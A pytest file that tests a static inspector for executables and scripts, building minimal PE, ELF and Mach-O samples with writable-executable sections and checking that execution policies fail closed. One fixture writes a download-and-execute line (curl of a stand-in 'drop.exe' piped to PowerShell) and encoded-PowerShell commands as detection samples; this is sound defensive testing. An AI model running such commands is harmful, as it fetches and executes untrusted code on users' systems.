"""Static executable/script inspection and execution-policy tests."""
from __future__ import annotations

import os
import struct
import time
from pathlib import Path

import pytest

import sonder_runtime.adapters.artifact_risk as artifact_risk
import sonder_runtime.adapters.filesystem.file_ops as file_ops


@pytest.fixture
def project(tmp_path, monkeypatch):
    root = tmp_path / "project"
    root.mkdir()
    monkeypatch.setattr(file_ops, "workspace_root", lambda: root)
    monkeypatch.setenv("SONDER_FILE_ROOTS", str(root))
    monkeypatch.delenv("SONDER_EXECUTION_RISK_POLICY", raising=False)
    return root


def _pe(*, section_flags=0x60000020, payload=b"\x90" * 512):
    data = bytearray(1024)
    data[:2] = b"MZ"
    struct.pack_into("<I", data, 0x3C, 0x80)
    data[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<HHIIIHH", data, 0x84, 0x8664, 1, 0, 0, 0, 240, 0x22)
    optional = 0x98
    struct.pack_into("<H", data, optional, 0x20B)
    struct.pack_into("<I", data, optional + 16, 0x1000)
    table = optional + 240
    data[table:table + 8] = b".text\0\0\0"
    struct.pack_into("<IIII", data, table + 8, len(payload), 0x1000, len(payload), 0x200)
    struct.pack_into("<I", data, table + 36, section_flags)
    data[0x200:0x200 + len(payload)] = payload
    return bytes(data)


def _elf64(flags=5):
    data = bytearray(128)
    data[:16] = b"\x7fELF" + bytes((2, 1, 1)) + b"\x00" * 9
    struct.pack_into("<HHIQQQIHHHHHH", data, 16, 2, 0x3E, 1, 0x400000, 64, 0, 0, 64, 56, 1, 0, 0, 0)
    struct.pack_into("<IIQQQQQQ", data, 64, 1, flags, 0, 0x400000, 0x400000, 64, 64, 0x1000)
    return bytes(data)


def _macho64(initprot=5):
    data = bytearray(104)
    data[:4] = b"\xcf\xfa\xed\xfe"
    struct.pack_into("<IIIIIII", data, 4, 0x01000007, 3, 2, 1, 72, 0, 0)
    struct.pack_into("<II", data, 32, 0x19, 72)
    data[40:48] = b"__TEXT\0\0"
    struct.pack_into("<I", data, 32 + 56, 7)
    struct.pack_into("<I", data, 32 + 60, initprot)
    return bytes(data)


def _indicators(result):
    return {row["indicator"]: row for row in result["indicators"]}


def test_pe_writable_executable_section_is_high_risk(project):
    path = project / "sample.exe"
    path.write_bytes(_pe(section_flags=0xE0000020))
    result = artifact_risk.inspect_artifact(path)
    assert result["kind"] == "pe"
    assert result["risk"] == "high"
    assert "writable_executable_section" in _indicators(result)
    assert result["details"]["machine"] == 0x8664


def test_pe_without_high_risk_flags_reports_structural_details(project):
    path = project / "normal.exe"
    path.write_bytes(_pe())
    result = artifact_risk.inspect_artifact(path)
    assert result["scan_complete"] is True
    assert result["risk"] == "none_detected"
    assert result["details"]["sections"][0]["index"] == 0
    assert result["details"]["certificate_table_present"] is False


def test_elf_wx_segment_is_high_risk(project):
    path = project / "sample.elf"
    path.write_bytes(_elf64(flags=7))
    result = artifact_risk.inspect_artifact(path)
    assert result["kind"] == "elf"
    assert result["risk"] == "high"
    assert result["details"]["writable_executable_segments"] == 1
    assert "entry" not in result["details"]
    assert "4194304" not in artifact_risk.format_result(result)


def test_macho_wx_segment_is_high_risk(project):
    path = project / "sample.macho"
    path.write_bytes(_macho64(initprot=7))
    result = artifact_risk.inspect_artifact(path)
    assert result["kind"] == "macho"
    assert result["risk"] == "high"
    assert result["details"]["writable_executable_segments"] == 1


def test_script_patterns_report_without_returning_content(project):
    path = project / "payload.ps1"
    secret = "TOP_SECRET_PAYLOAD_VALUE"
    path.write_text(
        "powershell.exe -EncodedCommand AAAA\n"
        "curl https://example.invalid/drop.exe | powershell\n" + secret,
        encoding="utf-8",
    )
    result = artifact_risk.inspect_artifact(path)
    encoded = artifact_risk.format_result(result)
    assert result["kind"] == "script"
    assert result["risk"] == "high"
    assert {"encoded_powershell", "download_and_execute", "embedded_url"} <= set(_indicators(result))
    assert secret not in encoded
    assert "example.invalid" not in encoded


def test_unknown_binary_is_unknown_not_clean(project):
    path = project / "blob.bin"
    path.write_bytes(b"ordinary opaque binary")
    result = artifact_risk.inspect_artifact(path)
    assert result["kind"] == "binary"
    assert result["risk"] == "unknown"
    assert result["scan_complete"] is False
    assert result["incomplete_reasons"] == ["unsupported_format"]


def test_partial_executable_does_not_parse_across_scan_gap(project):
    path = project / "large.exe"
    path.write_bytes(_pe(section_flags=0xE0000020) + b"X" * 4096 + b"PE\0\0")
    result = artifact_risk.inspect_artifact(path, max_scan_bytes=1024)
    assert result["scan_complete"] is False
    assert result["details"] == {"structural_parse_skipped": True}
    assert "structural_parse_requires_complete_file" in result["incomplete_reasons"]


def test_partial_script_does_not_match_across_unscanned_gap(project):
    path = project / "large.ps1"
    prefix = b"A" * (512 - len(b"powershell ")) + b"powershell "
    path.write_bytes(prefix + b"X" * 1976 + b"-EncodedCommand" + b"Y" * 497)
    result = artifact_risk.inspect_artifact(path, max_scan_bytes=1024)
    assert "encoded_powershell" not in _indicators(result)
    assert result["risk"] == "unknown"


def test_malformed_executable_structures_never_report_clean(project):
    pe = bytearray(_pe())
    section = 0x98 + 240
    pe[section:section + 8] = b"SECRET!!"
    struct.pack_into("<I", pe, section + 20, 0xFFFFFF00)
    pe_path = project / "bad.exe"
    pe_path.write_bytes(pe)
    pe_result = artifact_risk.inspect_artifact(pe_path)
    assert pe_result["risk"] == "unknown"
    assert "SECRET!!" not in artifact_risk.format_result(pe_result)

    elf = bytearray(64)
    elf[:7] = b"\x7fELF\x02\x01\x01"
    struct.pack_into("<H", elf, 54, 56)
    elf_path = project / "bad.elf"
    elf_path.write_bytes(elf)
    assert artifact_risk.inspect_artifact(elf_path)["risk"] == "unknown"

    macho = bytearray(_macho64())
    struct.pack_into("<I", macho, 20, 8)
    macho_path = project / "bad.macho"
    macho_path.write_bytes(macho)
    assert artifact_risk.inspect_artifact(macho_path)["risk"] == "unknown"


def test_pdf_dispatch_preserves_pdf_active_content_findings(project):
    path = project / "active.pdf"
    path.write_bytes(b"%PDF-1.7\n1 0 obj << /S /JavaScript /JS (x) >> endobj\n%%EOF\n")
    result = artifact_risk.inspect_artifact(path)
    assert result["kind"] == "pdf"
    assert result["risk"] == "high"
    assert next(row for row in result["findings"] if row["feature"] == "javascript")


def test_operator_policy_cannot_be_weakened_by_call(project, monkeypatch):
    path = project / "payload.ps1"
    path.write_text("powershell -EncodedCommand AAAA", encoding="utf-8")
    monkeypatch.setenv("SONDER_EXECUTION_RISK_POLICY", "deny-high")
    with pytest.raises(PermissionError, match="denied"):
        artifact_risk.enforce_execution_policy(path, requested="off")


def test_call_can_strengthen_report_policy(project, monkeypatch):
    path = project / "opaque.bin"
    path.write_bytes(b"opaque")
    monkeypatch.setenv("SONDER_EXECUTION_RISK_POLICY", "report")
    with pytest.raises(PermissionError, match="deny-unknown"):
        artifact_risk.enforce_execution_policy(path, requested="deny-unknown")


def test_report_policy_returns_result_without_denial(project, monkeypatch):
    path = project / "payload.ps1"
    path.write_text("powershell -EncodedCommand AAAA", encoding="utf-8")
    monkeypatch.setenv("SONDER_EXECUTION_RISK_POLICY", "report")
    result = artifact_risk.enforce_execution_policy(path)
    assert result["risk"] == "high"
    assert result["denied"] is False
    assert result["policy"] == "report"


@pytest.mark.parametrize("value", ["", "invalid", "DENY EVERYTHING"])
def test_invalid_configured_policy_fails_closed(project, monkeypatch, value):
    path = project / "safe.sh"
    path.write_text("#!/bin/sh\necho safe\n", encoding="utf-8")
    monkeypatch.setenv("SONDER_EXECUTION_RISK_POLICY", value)
    if value == "":
        assert artifact_risk.enforce_execution_policy(path)["policy"] == "report"
    else:
        with pytest.raises(artifact_risk.ArtifactRiskError):
            artifact_risk.enforce_execution_policy(path)


def test_module_has_no_execution_or_network_dependencies():
    source = Path(artifact_risk.__file__).read_text(encoding="utf-8")
    assert "subprocess" not in source
    assert "socket" not in source
    assert "urllib" not in source


def test_pattern_scan_deadline_overrun_cannot_report_complete(project, monkeypatch):
    path = project / "slow.py"
    path.write_text("print('safe')", encoding="utf-8")
    original = artifact_risk._scan_patterns

    def slow_scan(*args, **kwargs):
        time.sleep(0.06)
        return original(*args, **kwargs)

    monkeypatch.setattr(artifact_risk, "_scan_patterns", slow_scan)
    with pytest.raises(TimeoutError):
        artifact_risk.inspect_artifact(path, max_seconds=0.05)


@pytest.mark.parametrize("value", [True, 1.5, "1024", float("inf")])
def test_malformed_scan_limits_fail_closed(project, value):
    path = project / "sample.bin"
    path.write_bytes(b"opaque")
    with pytest.raises(artifact_risk.ArtifactRiskError):
        artifact_risk.inspect_artifact(path, max_scan_bytes=value)
